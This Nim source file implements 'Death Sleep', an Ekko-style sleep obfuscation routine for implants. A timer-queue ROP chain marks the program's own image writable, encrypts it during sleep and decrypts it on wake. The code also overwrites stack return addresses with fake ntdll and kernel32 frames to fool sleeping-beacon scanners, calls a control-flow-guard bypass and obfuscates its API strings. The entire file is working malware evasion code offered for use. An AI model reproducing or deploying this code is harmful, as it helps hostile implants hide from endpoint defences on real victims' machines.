# Death Sleep — Ekko-style timer queue encryption with call stack spoofing
#
# Combines Ekko's encrypt-during-sleep ROP chain with a clean call stack:
# before entering sleep, the thread's stack frames are overwritten with
# plausible ntdll/kernel32 return addresses so scanners like
# hunt-sleeping-beacons see a legitimate Windows call chain.
#
# Extra ROP step restores original stack on wake via RtlMoveMemory.

import winim/lean
import std/random
import cfg
import strenc

type
  USTRING* {.bycopy.} = object
    Length*: DWORD
    MaximumLength*: DWORD
    Buffer*: PVOID

randomize()

proc findBaseAddress(start: PVOID): PVOID =
  var candidate: PVOID = start
  var candidateMZ: PIMAGE_DOS_HEADER
  var candidatePE: PIMAGE_NT_HEADERS
  var offset: LONG
  while true:
    candidateMZ = cast[PIMAGE_DOS_HEADER](candidate)
    if candidateMZ.e_magic == IMAGE_DOS_SIGNATURE:
      offset = candidateMZ.e_lfanew
      if offset > sizeof(IMAGE_DOS_HEADER) and offset < 1024:
        candidatePE = cast[PIMAGE_NT_HEADERS](cast[uint](candidate) + cast[uint](offset))
        if candidatePE.Signature == IMAGE_NT_SIGNATURE:
          return candidate
    candidate = cast[PVOID](cast[uint](candidate) - 1)

proc spoofCallStack(rsp: DWORD64, backup: var seq[byte]) =
  ## Overwrite the top 3 return addresses on the stack with plausible
  ## ntdll/kernel32 addresses. Saves original bytes into `backup`.
  let ntdll = GetModuleHandleA(obf("ntdll"))
  let kernel32 = GetModuleHandleA(obf("kernel32.dll"))

  let rtlUserThreadStart = cast[DWORD64](
    GetProcAddress(ntdll, obf("RtlUserThreadStart"))
  )
  let baseThreadInitThunk = cast[DWORD64](
    GetProcAddress(kernel32, obf("BaseThreadInitThunk"))
  )

  let numFrames = 3
  let patchSize = numFrames * 8

  # Backup original stack contents
  backup.setLen(patchSize)
  copyMem(addr(backup[0]), cast[pointer](rsp), patchSize)

  # Write fake return addresses
  let slots = cast[ptr UncheckedArray[DWORD64]](rsp)
  if rtlUserThreadStart != 0:
    slots[0] = rtlUserThreadStart + 0x21  # offset into function body
  if baseThreadInitThunk != 0:
    slots[1] = baseThreadInitThunk + 0x14
  slots[2] = 0  # thread start (null terminator)

proc deathSleepObf*(st: int): VOID =
  var CtxThread: CONTEXT
  var RopProtRW: CONTEXT
  var RopMemEnc: CONTEXT
  var RopDelay: CONTEXT
  var RopMemDec: CONTEXT
  var RopProtRX: CONTEXT
  var RopRestore: CONTEXT
  var RopSetEvt: CONTEXT
  var hTimerQueue: HANDLE
  var hNewTimer: HANDLE
  var hEvent: HANDLE
  var ImageBase: PVOID = nil
  var ImageSize: DWORD = 0
  var OldProtect: DWORD = 0
  var SleepTime: DWORD = cast[DWORD](st)

  var KeyBuf: array[16, CHAR] = [
    CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)),
    CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)),
    CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)),
    CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255)), CHAR(rand(255))
  ]
  var Key: USTRING = USTRING(Length: 0)
  var Img: USTRING = USTRING(Length: 0)
  var NtContinue: PVOID = nil
  var SysFunc032: PVOID = nil

  hEvent = CreateEventW(nil, 0, 0, nil)
  hTimerQueue = CreateTimerQueue()

  NtContinue = GetProcAddress(GetModuleHandleA(obf("ntdll")), obf("NtContinue"))
  SysFunc032 = GetProcAddress(LoadLibraryA(obf("Advapi32")), obf("SystemFunction032"))

  ImageBase = findBaseAddress(cast[PVOID](findBaseAddress))
  ImageSize = (cast[PIMAGE_NT_HEADERS](cast[uint](ImageBase) +
      cast[uint]((cast[PIMAGE_DOS_HEADER](ImageBase)).e_lfanew))).OptionalHeader.SizeOfImage

  Key.Buffer = KeyBuf.addr
  Key.Length = 16
  Key.MaximumLength = 16
  Img.Buffer = ImageBase
  Img.Length = ImageSize
  Img.MaximumLength = ImageSize

  # CFG bypass
  discard evadeCFG(NtContinue)

  if CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](RtlCaptureContext),
                          addr(CtxThread), 0, 0, WT_EXECUTEINTIMERTHREAD):
    WaitForSingleObject(hEvent, 0x32)

    # Spoof call stack before entering the ROP chain
    var stackBackup: seq[byte] = @[]
    spoofCallStack(CtxThread.Rsp, stackBackup)

    copyMem(addr(RopProtRW),  addr(CtxThread), sizeof(CONTEXT))
    copyMem(addr(RopMemEnc),  addr(CtxThread), sizeof(CONTEXT))
    copyMem(addr(RopDelay),   addr(CtxThread), sizeof(CONTEXT))
    copyMem(addr(RopMemDec),  addr(CtxThread), sizeof(CONTEXT))
    copyMem(addr(RopProtRX),  addr(CtxThread), sizeof(CONTEXT))
    copyMem(addr(RopRestore), addr(CtxThread), sizeof(CONTEXT))
    copyMem(addr(RopSetEvt),  addr(CtxThread), sizeof(CONTEXT))

    var VirtualProtectAddr = GetProcAddress(GetModuleHandleA(obf("kernel32")), obf("VirtualProtect"))

    # VirtualProtect(RW)
    dec(RopProtRW.Rsp, 8)
    RopProtRW.Rip = cast[DWORD64](VirtualProtectAddr)
    RopProtRW.Rcx = cast[DWORD64](ImageBase)
    RopProtRW.Rdx = cast[DWORD64](ImageSize)
    RopProtRW.R8 = PAGE_READWRITE
    RopProtRW.R9 = cast[DWORD64](addr(OldProtect))

    # Encrypt
    dec(RopMemEnc.Rsp, 8)
    RopMemEnc.Rip = cast[DWORD64](SysFunc032)
    RopMemEnc.Rcx = cast[DWORD64](addr(Img))
    RopMemEnc.Rdx = cast[DWORD64](addr(Key))

    # Sleep
    dec(RopDelay.Rsp, 8)
    RopDelay.Rip = cast[DWORD64](WaitForSingleObject)
    var ntCurrentProc: HANDLE = -1
    RopDelay.Rcx = cast[DWORD64](ntCurrentProc)
    RopDelay.Rdx = SleepTime

    # Decrypt
    dec(RopMemDec.Rsp, 8)
    RopMemDec.Rip = cast[DWORD64](SysFunc032)
    RopMemDec.Rcx = cast[DWORD64](addr(Img))
    RopMemDec.Rdx = cast[DWORD64](addr(Key))

    # VirtualProtect(RX)
    dec(RopProtRX.Rsp, 8)
    RopProtRX.Rip = cast[DWORD64](VirtualProtectAddr)
    RopProtRX.Rcx = cast[DWORD64](ImageBase)
    RopProtRX.Rdx = cast[DWORD64](ImageSize)
    RopProtRX.R8 = PAGE_EXECUTE_READWRITE
    RopProtRX.R9 = cast[DWORD64](addr(OldProtect))

    # Restore original stack (RtlMoveMemory)
    var RtlMoveMemoryAddr = cast[DWORD64](
      GetProcAddress(GetModuleHandleA(obf("ntdll")), obf("RtlMoveMemory"))
    )
    dec(RopRestore.Rsp, 8)
    RopRestore.Rip = RtlMoveMemoryAddr
    RopRestore.Rcx = CtxThread.Rsp
    RopRestore.Rdx = cast[DWORD64](addr(stackBackup[0]))
    RopRestore.R8  = cast[DWORD64](stackBackup.len)

    # SetEvent
    dec(RopSetEvt.Rsp, 8)
    RopSetEvt.Rip = cast[DWORD64](SetEvent)
    RopSetEvt.Rcx = cast[DWORD64](hEvent)

    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopProtRW), 100, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopMemEnc), 200, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopDelay), 300, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopMemDec), 400, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopProtRX), 500, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopRestore), 600, 0, WT_EXECUTEINTIMERTHREAD)
    CreateTimerQueueTimer(addr(hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](NtContinue),
                          addr(RopSetEvt), 700, 0, WT_EXECUTEINTIMERTHREAD)

    WaitForSingleObject(hEvent, INFINITE)

  DeleteTimerQueue(hTimerQueue)
